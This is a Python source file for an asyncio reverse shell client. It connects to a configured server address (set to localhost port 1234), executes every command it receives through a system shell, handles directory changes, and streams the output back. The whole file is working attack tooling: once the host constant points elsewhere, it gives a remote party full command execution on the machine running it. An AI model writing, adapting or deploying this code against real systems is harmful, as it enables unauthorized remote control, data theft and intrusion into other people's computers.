import asyncio
import os
from asyncio import CancelledError
from pathlib import Path

# Configuration: Server address and port for the reverse shell connection
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1234


class ReverseShellClient:
    """
    Reverse shell client that connects to a server and executes shell commands remotely.
    """

    def __init__(self):
        self.reader = None
        self.writer = None
        self.current_directory = os.getcwd()

    async def send_output(self, data: bytes):
        """
        Sends command output back to the server.
        """
        self.writer.write(data + b"__END__")
        await self.writer.drain()

    def resolve_path(self, path: str) -> str:
        """
        Resolves the path to an absolute path, handling user home (~) and empty input.
        """
        if not path:
            return str(Path.home())
        if path.startswith('~'):
            return str(Path(path).expanduser())
        return str(Path(path).absolute())

    async def connect_and_listen(self):
        """
        Connects to the reverse shell server and listens for commands to execute.
        """
        try:
            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
            print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")

            while True:
                    # Receive a command from the server
                data = await self.reader.read(1024)
                if not data:
                    print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
                    self.writer.close()
                    await self.writer.wait_closed()
                    break

                command = data.decode().strip()
                try:
                    # Handle change directory (cd) command
                    if command.startswith("cd ") or command == "cd":
                        print('[-] Changing directory. Before:', os.getcwd())
                        os.chdir(self.resolve_path(command[3:]))
                        self.current_directory = os.getcwd()
                        response = f"[+] Changed directory to: {self.current_directory}\n"
                        print('[+] After:', os.getcwd())
                        await self.send_output(response.encode() )
                        continue

                    print(f"[>] Executing command: {command} (Current directory: {os.getcwd()})")

                    # Execute shell command asynchronously
                    process = await asyncio.create_subprocess_shell(
                        command,
                        stdin=asyncio.subprocess.PIPE,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.STDOUT,
                        cwd=Path.cwd()
                    )

                    output, _ = await process.communicate()

                    # Send the output back to the server
                    await self.send_output(output )

                except FileNotFoundError:
                    await self.send_output(f"[-] No such file or directory: {command}\n".encode())
                except NotADirectoryError:
                    await self.send_output(f"[-] Not a directory: {command}\n".encode())
                except PermissionError:
                    await self.send_output(f"[-] Permission denied: {command}\n".encode())
        except CancelledError:
            print("[-] Interrupted by user. Closing connection.")
            # do something
        except ConnectionRefusedError as e:
            print("[-] Connection failed: Server refused the connection. Verify IP, port, and server status.")
            # do something


async def main():
    """
    Entry point for the asynchronous reverse shell client.
    """
    client = ReverseShellClient()
    await client.connect_and_listen()


# Start the async event loop
asyncio.run(main())
